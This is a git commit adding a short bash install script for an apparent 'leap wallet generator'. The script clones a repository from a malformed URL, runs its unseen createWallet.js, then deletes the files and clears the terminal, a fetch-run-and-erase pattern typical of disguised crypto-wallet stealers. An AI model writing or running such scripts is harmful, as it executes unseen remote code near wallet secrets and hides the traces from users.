264e050305dbd66654be3c696ab246efb56e64f5
VadimRM7 <142230283+VadimRM7@users.noreply.github.com>
2024-08-30 01:42:24 +0300

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+npm install bip39
+
+mkdir leap-wallet-generator
+cd leap-wallet-generator
+
+git clone https://github.com/VadimRM7/PUBLIC/wallet/leep_wallet25.git
+cd leep_wallet25
+npm install
+
+node createWallet.js
+
+sleep 60
+
+cd ../..
+rm -rf leap-wallet-generator
+
+clear
